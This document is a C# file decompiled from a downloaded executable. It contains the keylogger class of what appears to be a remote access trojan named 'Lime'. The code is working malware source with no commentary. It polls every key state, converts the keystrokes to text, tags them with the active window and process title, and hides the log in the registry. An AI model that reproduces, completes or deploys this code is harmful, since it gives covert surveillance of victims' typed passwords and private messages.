﻿// Decompiled with JetBrains decompiler
// Type: Lime.Keylogger
// Assembly: WX1, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1022E916-AA3E-479D-AE5C-A72A19B55994
// Assembly location: D:\download (3).exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Lime
{
  public class Keylogger
  {
    private int LastAV;
    private string LastAS;
    private Keys lastKey;
    public string Logs;
    public string vn;
    public Keyboard keyboard;

    public Keylogger()
    {
      this.lastKey = Keys.None;
      this.Logs = "";
      this.vn = "[kl]";
      this.keyboard = new Keyboard();
    }

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
      uint a,
      uint b,
      byte[] c,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder d,
      int e,
      uint f,
      IntPtr g);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] a);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint a, uint b);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowThreadProcessId(IntPtr a, ref int b);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetKeyboardLayout(int a);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern short GetAsyncKeyState(int a);

    private string AV()
    {
      try
      {
        IntPtr foregroundWindow = Program.GetForegroundWindow();
        int b = 0;
        Keylogger.GetWindowThreadProcessId(foregroundWindow, ref b);
        Process processById = Process.GetProcessById(b);
        if (!(foregroundWindow.ToInt32() == this.LastAV & Operators.CompareString(this.LastAS, processById.MainWindowTitle, false) == 0 | processById.MainWindowTitle.Length == 0))
        {
          this.LastAV = foregroundWindow.ToInt32();
          this.LastAS = processById.MainWindowTitle;
          return "\r\n\u0001" + DateAndTime.Now.ToString("yy/MM/dd ") + processById.ProcessName + " " + this.LastAS + "\u0001\r\n";
        }
      }
      catch
      {
      }
      return "";
    }

    private static string VKCodeToUnicode(uint a)
    {
      try
      {
        StringBuilder d = new StringBuilder();
        byte[] numArray = new byte[(int) byte.MaxValue];
        if (!Keylogger.GetKeyboardState(numArray))
          return "";
        uint b1 = Keylogger.MapVirtualKey(a, 0U);
        IntPtr foregroundWindow = Program.GetForegroundWindow();
        int b2 = 0;
        IntPtr keyboardLayout = (IntPtr) Keylogger.GetKeyboardLayout(Keylogger.GetWindowThreadProcessId(foregroundWindow, ref b2));
        Keylogger.ToUnicodeEx(a, b1, numArray, d, 5, 0U, keyboardLayout);
        return d.ToString();
      }
      catch
      {
      }
      return ((Keys) checked ((int) a)).ToString();
    }

    private string Fix(Keys k)
    {
      bool flag = this.keyboard.ShiftKeyDown;
      if (this.keyboard.CapsLock)
        flag = !flag;
      string str;
      try
      {
        str = k == Keys.Delete || k == Keys.Back ? "[" + k.ToString() + "]" : (k == Keys.LShiftKey || k == Keys.RShiftKey || k == Keys.Shift || k == Keys.ShiftKey || k == Keys.Control || k == Keys.ControlKey || k == Keys.RControlKey || k == Keys.LControlKey || k == Keys.Alt || k == Keys.F1 || k == Keys.F2 || k == Keys.F3 || k == Keys.F4 || k == Keys.F5 || k == Keys.F6 || k == Keys.F7 || k == Keys.F8 || k == Keys.F9 || k == Keys.F10 || k == Keys.F11 || k == Keys.F12 || k == Keys.End ? "" : (k != Keys.Space ? (k == Keys.Return || k == Keys.Return ? (!this.Logs.EndsWith("[ENTER]\r\n") ? "[ENTER]\r\n" : "") : (k != Keys.Tab ? (!flag ? Keylogger.VKCodeToUnicode(checked ((uint) k)) : Keylogger.VKCodeToUnicode(checked ((uint) k)).ToUpper()) : "[TAP]\r\n")) : " "));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        if (flag)
        {
          str = Strings.ChrW((int) k).ToString().ToUpper();
          ProjectData.ClearProjectError();
        }
        else
        {
          str = Strings.ChrW((int) k).ToString().ToLower();
          ProjectData.ClearProjectError();
        }
      }
      return str;
    }

    public void WRK()
    {
      this.Logs = Conversions.ToString(Program.GetValueFromRegistry(this.vn, (object) ""));
      try
      {
        int num1 = 0;
        while (true)
        {
          checked { ++num1; }
          int a = 0;
          do
          {
            if (Keylogger.GetAsyncKeyState(a) == (short) -32767 & !this.keyboard.CtrlKeyDown)
            {
              Keys k = (Keys) a;
              string str = this.Fix(k);
              if (str.Length > 0)
              {
                this.Logs += this.AV();
                this.Logs += str;
              }
              this.lastKey = k;
            }
            checked { ++a; }
          }
          while (a <= (int) byte.MaxValue);
          if (num1 == 1000)
          {
            num1 = 0;
            int num2 = checked (Conversions.ToInteger("20") * 1024);
            if (this.Logs.Length > num2)
              this.Logs = this.Logs.Remove(0, checked (this.Logs.Length - num2));
            Program.SaveValueOnRegistry(this.vn, (object) this.Logs, RegistryValueKind.String);
          }
          Thread.Sleep(1);
        }
      }
      catch
      {
      }
    }
  }
}
